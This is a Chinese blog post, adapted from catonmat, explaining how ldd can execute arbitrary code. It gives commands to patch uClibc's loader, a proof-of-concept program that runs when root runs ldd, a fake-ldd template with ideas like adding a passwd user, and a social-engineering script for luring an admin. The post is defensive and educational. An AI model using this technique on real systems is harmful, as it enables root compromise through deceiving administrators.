@@ -1,0 +1,198 @@
+<html><body><p>我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。</p>
+<p>首先，我们先来了解一下，我们怎么来使用ldd的，请你看一下下面的几个命令：</p>
+<pre class="EnlighterJSRAW">(1) $ ldd /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7eca000)
+        /lib/ld-linux.so.2 (0xb801e000)
+
+(2) $ LD_TRACE_LOADED_OBJECTS=1 /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7e30000)
+        /lib/ld-linux.so.2 (0xb7f84000)
+
+(3) $ LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep
+        linux-gate.so.1 =&gt;  (0xffffe000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0xb7f7c000)
+        /lib/ld-linux.so.2 (0xb80d0000)</pre>
+<p>第(1)个命令，我们运行了 <code class="EnlighterJSRAW">ldd</code> 于 <code class="EnlighterJSRAW">/bin/grep</code>。我们可以看到命令的输出是我们想要的，那就是 <code class="EnlighterJSRAW">/bin/grep</code> 所依赖的动态链接库。</p>
+<p>第(2)个命令设置了一个叫 LD_TRACE_LOADED_OBJECTS 的环境变量，然后就好像在运行命令 <code class="EnlighterJSRAW">/bin/grep</code> (但其实并不是)。 其运行结果和ldd的输出是一样的！</p>
+<p>第(3)个命令也是设置了环境变量 LD_TRACE_LOADED_OBJECTS ，然后调用了动态链接库 <code class="EnlighterJSRAW">ld-linux.so</code> 并把 <code class="EnlighterJSRAW">/bin/grep</code> 作为参数传给它。我们发现，其输出结果还是和前面两个一样的。</p>
+<p><span id="more-1626"></span></p>
+<h4>具体发生了什么？</h4>
+<p>对于第二个和第三个命令来说，好像是对 <code class="EnlighterJSRAW">ldd</code> 的一个包装或是一个隐式调用。对于第二个和第三个命令来说， <code class="EnlighterJSRAW">/bin/grep</code> 这个命令就根本没有被运行。这是一个GNU动态载入器的怪异的特性。如果其注意到环境变量LD_TRACE_LOADED_OBJECTS 被设置了，那么它就不会去执行那个可运行的程序，而去输出这个可执行程序所依赖的动态链接库 （在BSD 系统上的<code class="EnlighterJSRAW">ldd</code> 是一个C 程序)。</p>
+<p>如果你使用的是Linux，那么，你可以去看看 <code class="EnlighterJSRAW">ldd</code> 程序，你会发现这是一个 bash 的脚本。如果你仔细查看这个脚本的源码，你会发现，第二个命令和第三个命令的差别就在于 <code class="EnlighterJSRAW">ld-linux.so</code> 装载器是否可以被<code class="EnlighterJSRAW">ldd</code>所装载，如果不能，那就是第二个命令，如果而的话，那就是第三个命令。</p>
+<p>所以，如果我们可以让<code class="EnlighterJSRAW">ld-linux.so</code> 装载器失效的话，或是让别的装载器来取代这个系统默认的动态链接库的话，那么我们就可以让 <code class="EnlighterJSRAW">ldd</code>来载入并运行我们想要程序了——使用不同的载装器并且不处理LD_TRACE_LOADED_OBJECTS 环境变量，而是直接运行程序。</p>
+<p>例如，你可以创建一个具有恶意的程序，如： ~/app/bin/exec 并且使用他自己的装载器 ~/app/lib/loader.so。如果某人（比如超级用户root） 运行了 <code class="EnlighterJSRAW">ldd /home/you/app/bin/exec</code> ，于是，他就玩完了。因为，那并不会列出所依赖的动态链接库，而是，直接执行你的那个恶意程序，这相当于，那个用户给了你他的授权。</p>
+<h4>编译一个新的装载器</h4>
+<p>下载 <a href="http://www.uclibc.org/">uClibc</a> C库。这是一个相当漂亮的代码，并且可以非常容易地修改一下源代码，使其忽略LD_TRACE_LOADED_OBJECTS 检查。</p>
+<pre class="EnlighterJSRAW">$ mkdir app
+$ cd app
+app$ wget 'http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2'</pre>
+<p>解压这个包，并执行 <code class="EnlighterJSRAW">make menuconfig</code>，选项你的平台架构（比如：i386），剩下的事情保持不变。</p>
+<pre class="EnlighterJSRAW">$ bunzip2 &lt; uClibc-0.9.30.1.tar.bz2 | tar -vx
+$ rm -rf uClibc-0.9.30.1.tar.bz2
+$ cd uClibc-0.9.30.1
+$ make menuconfig</pre>
+<p>编辑 .config 并设置目标安装目录：到 <code class="EnlighterJSRAW">/home/you/app/uclibc</code>，<br/>
+把下面两行</p>
+<pre class="EnlighterJSRAW">
+RUNTIME_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/"
+DEVEL_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/usr/"</pre>
+<p>改成</p>
+<pre class="EnlighterJSRAW">RUNTIME_PREFIX="/home/you/app/uclibc/"
+DEVEL_PREFIX="/home/you/app/uclibc/usr/"</pre>
+<p>现在你需要改动一下其源代码，让其忽略LD_TRACE_LOADED_OBJECTS 环境变量的检查。 下面是个这修改的diff，你需要修改的是 <code class="EnlighterJSRAW">ldso/ldso/ldso.c</code> 文件。你可把下面的这个diff存成一个叫file的文件，然后运行这个命令：<code class="EnlighterJSRAW">patch -p0 &lt; file</code>。如果你不这样做的话，那么，我们的黑客程序就无法工作，而我们的这个装载器还是会认为 <code class="EnlighterJSRAW">ldd</code> 想列出动态链接库的文件列表。</p>
+<p>[patch]<br/>
+— ldso/ldso/ldso-orig.c       2009-10-25 00:27:12.000000000 +0300<br/>
++++ ldso/ldso/ldso.c    2009-10-25 00:27:22.000000000 +0300<br/>
+@@ -404,9 +404,11 @@<br/>
+         }  #endif<br/>
++    /*<br/>
+         if (_dl_getenv("LD_TRACE_LOADED_OBJECTS", envp) != NULL) {<br/>
+                 trace_loaded_objects++;<br/>
+         }<br/>
++    */<br/>
+   #ifndef __LDSO_LDD_SUPPORT__<br/>
+         if (trace_loaded_objects) {<br/>
+[/patch]</p>
+<p>下面让我们来编译并安装它。</p>
+<pre class="EnlighterJSRAW">$ make -j 4
+$ make install</pre>
+<p>于是，我们的 uClibc 装载器就被安装了，并且libc 库指向了 /home/you/app/uclibc. 就这么简单，现在，我们需要做的就是把我们的uClibc的装载器 (app/lib/ld-uClibc.so.0)变成默认的。</p>
+<h4>小试 牛刀</h4>
+<p>首先，先让我们来创建一个测试程序，这人程序也就是输出些自己的东西，这样可以让我们看到我们的程序被执行了。我们把这个程序放在 <code class="EnlighterJSRAW">app/bin/</code>下，叫“myapp.c”，下面是源代码</p>
+<pre class="EnlighterJSRAW">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+  if (getenv("LD_TRACE_LOADED_OBJECTS")) {
+    printf("All your things are belong to me.\n");
+  }
+  else {
+    printf("Nothing.\n");
+  }
+  return 0;
+}</pre>
+<p>这是一个很简单的代码了，这段代码主要检查一下环境变量LD_TRACE_LOADED_OBJECTS 是否被设置了，如果是，那么恶意程序执行，如果没有，那么程序什么也不发生。</p>
+<p>下面是编译程序的命令，，大家可以看到，我们静态链接了一些函数库。我们并不想让LD_LIBRARY_PATH这个变量来发挥作用。</p>
+<pre class="EnlighterJSRAW">$ L=/home/you/app/uclibc
+$ gcc -Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0 \
+    -Wl,-rpath-link,$L/lib \
+    -nostdlib \
+    myapp.c -o myapp \
+    $L/usr/lib/crt*.o \
+    -L$L/usr/lib/ \
+    -lc</pre>
+<p>下面是GCC的各个参数的解释：</p>
+<ul>
+<li><strong>-Wl,–dynamic-linker,$L/lib/ld-uClibc.so.0</strong> — 指定一个新的装载器。</li>
+<li><strong>-Wl,-rpath-link,$L/lib</strong> — 指定一个首要的动态装载器所在的目录，这个目录用于查找动态库。</li>
+<li><strong>-nostdlib</strong> — 不使用系统标准库。</li>
+<li><strong>myapp.c -o myapp</strong> — 编译myapp.c 成可执行文件 myapp,</li>
+<li><strong>$L/usr/lib/crt*.o</strong> — 静态链接runtime 代码</li>
+<li><strong>-L$L/usr/lib/</strong> — libc 的目录（静态链接）</li>
+<li><strong>-lc</strong> —  C 库</li>
+</ul>
+<p>现在让我们来运行一下我们的 <code class="EnlighterJSRAW">myapp</code> （没有ldd，一切正常）</p>
+<pre class="EnlighterJSRAW">app/bin$ ./myapp
+Nothing.</pre>
+<p>LD_TRACE_LOADED_OBJECTS 没有设置，所以输出 “Nothing” 。</p>
+<p>现在，让我们来使用 <code class="EnlighterJSRAW">ldd</code> 来看看这个程序的最大的影响力，让我们以root身份来干这个事。</p>
+<pre class="EnlighterJSRAW">$ su
+Password:
+# ldd ./myapp
+All your things are belong to me.</pre>
+<p>哈哈，我们可以看到，ldd触发了我们的恶意代码。于是，我们偷了整个系统！</p>
+<h4>邪恶的程序</h4>
+<p>下面这个例子更为实际一些，如果没有<code class="EnlighterJSRAW">ldd</code> ，那程序程序会报错 “error while loading shared libraries” ，这个错误信息会引诱你去去使用 <code class="EnlighterJSRAW">ldd</code> 去做检查，如果你是root的话，那么就整个系统就玩完了。而当你可以了 <code class="EnlighterJSRAW">ldd</code> 后，它会在干完坏事后，模仿正确的<code class="EnlighterJSRAW">ldd</code>的输出，告诉你 <code class="EnlighterJSRAW">libat.so.0</code> 不存在。</p>
+<p>下面的代码仅仅是向你展示了一下整个想法，代码还需加工和改善。</p>
+<pre class="EnlighterJSRAW">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+/*
+This example pretends to have a fictitious library 'libat.so.0' missing.
+When someone with root permissions runs `ldd this_program`, it does
+something nasty in malicious() function.
+
+I haven't implemented anything malicious but have written down some ideas
+of what could be done.
+
+This is, of course, a joke program. To make it look more real, you'd have
+to bump its size, add some more dependencies, simulate trying to open the
+missing library, detect if ran under debugger or strace and do absolutely
+nothing suspicious, etc.
+*/
+
+void pretend_as_ldd()
+{
+    printf("\tlinux-gate.so.1 =&gt;  (0xffffe000)\n");
+    printf("\tlibat.so.0 =&gt; not found\n");
+    printf("\tlibc.so.6 =&gt; /lib/libc.so.6 (0xb7ec3000)\n");
+    printf("\t/lib/ld-linux.so.2 (0xb8017000)\n");
+}
+
+void malicious()
+{
+    if (geteuid() == 0) {
+        /* we are root ... */
+        printf("poof, all your box are belong to us\n");
+
+        /* silently add a new user to /etc/passwd, */
+        /* or create a suid=0 program that you can later execute, */
+        /* or do something really nasty */
+    }
+}
+
+int main(int argc, char **argv)
+{
+    if (getenv("LD_TRACE_LOADED_OBJECTS")) {
+        malicious();
+        pretend_as_ldd();
+        return 0;
+    }
+
+    printf("%s: error while loading shared libraries: libat.so.0: "
+           "cannot open shared object file: No such file or directory\n",
+           argv[0]);
+    return 127;
+}</pre>
+<p> </p>
+<h4>邪恶的电话</h4>
+<p>事实上来说，上面的那段程序可能的影响更具破坏性，因为大多数的系统管理员可能并不知道不能使用 <code class="EnlighterJSRAW">ldd</code> 去测试那些不熟悉的执行文件。下面是一段很可能会发现的对话，让我们看看我们的程序是如何更快地获得系统管理员的权限的。</p>
+<p>系统管理员的电话狂响……</p>
+<p>系统管理员： “同志你好，我是系统管理员，有什么可以帮你的？”</p>
+<p>黑客：“管理员同志你好。我有一个程序不能运行，总是报错，错误好像是说一个系统动态链接库有问题，你能不能帮我看看？”</p>
+<p>系统管理员：“没问题，你的那个程序在哪里？”</p>
+<p>黑客： “在我的home目录下，/home/hchen/app/bin/myapp”。</p>
+<p>系统管理员：“ OK，等一会儿”，黑客在电话这头可以听到一些键盘的敲击声。</p>
+<p>系统管理员：“好像是动态链接库的问题，你能告诉我你的程序具体需要什么样的动态链接库吗？”</p>
+<p>黑客说: “谢谢，应该没有别的嘛。”</p>
+<p>系统管理员：“嗯，查到了，说是没有了 <code class="EnlighterJSRAW">libat.so.0</code>这是你自己的动态链接库吗？”</p>
+<p>黑客说：“哦，好像是的，你等一下，我看看……” 黑客在那头露出了邪恶的笑，并且，讯速地输入了下面的命令：</p>
+<p style="padding-left: 30px;"><code class="EnlighterJSRAW">mv ~/.hidden/working_app ~/app/bin/myapp</code><br/>
+<code class="EnlighterJSRAW">mv ~/.hidden/libat.so.o ~/app/bin/</code></p>
+<p>黑客说：“哦，对了，的确是我的不对，我忘了把这个链接库拷过来了，现在应该可以了，谢谢你啊，真是不好意思，麻烦你了”</p>
+<p>系统管理员： “没事就行了，下次注意啊！”（然后系统管理心里暗骂，TMD，又一个白痴用户！……）</p>
+<p><strong>教训一：千万不要使用 <code class="EnlighterJSRAW">ldd</code> 去测试你不知道的文件！<br/>
+教训二：千万不要相信陌生人！</strong></p>
+<p>文章：<a href="http://www.catonmat.net/blog/ldd-arbitrary-code-execution/" target="_blank">来源</a>（以上文章并非完全翻译，我做过一些修改，所以，如果你要转载，请注明作者和出处）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px; color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+<div class="wp_rp_wrap wp_rp_vertical_m"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/22320.html"><img alt="eBPF 介绍" height="150" src="../wp-content/uploads/2022/12/eBPF-150x150.jpeg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/22320.html">eBPF 介绍</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/19219.html"><img alt="打造高效的工作环境 – Shell 篇" height="150" src="../wp-content/uploads/2019/03/linux.ninja_-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/19219.html">打造高效的工作环境 – Shell 篇</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/18654.html"><img alt="记一次Kubernetes/Docker网络排障" height="150" src="../wp-content/uploads/2018/12/docker-networking-1-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/18654.html">记一次Kubernetes/Docker网络排障</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/18360.html"><img alt="程序员练级攻略（2018)  与我的专栏" height="150" src="../wp-content/uploads/2018/05/300x262-150x150.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/18360.html">程序员练级攻略（2018)  与我的专栏</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/17998.html"><img alt="Linux PID 1 和 Systemd" height="150" src="../wp-content/uploads/2017/07/systemd-1-150x150.jpeg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/17998.html">Linux PID 1 和 Systemd</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/17416.html"><img alt="缓存更新的套路" height="150" src="../wp-content/uploads/2016/07/cache-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/17416.html">缓存更新的套路</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1626.html">ldd 的一个安全问题</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.</body></html>
